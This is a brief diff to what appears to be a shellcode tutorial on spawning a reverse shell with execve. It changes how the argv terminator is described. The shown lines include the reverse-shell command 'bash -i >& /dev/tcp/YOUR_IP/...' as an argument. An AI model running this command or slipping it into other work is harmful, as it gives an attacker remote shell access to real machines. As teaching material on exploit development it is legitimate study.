@@ -140,7 +140,7 @@ Here is how to call reverse shell using execve:
   1. Pointer to b'/bin/bash'
   2. Pointer to b'-c'
   3. Pointer to b"bash -i >& /dev/tcp/YOUR_IP/LOCAL_OPENING_PORT 0>&1"
-  4. Pointer to NULL
+  4. Null 
     </b>
 
 - RDX: NULL
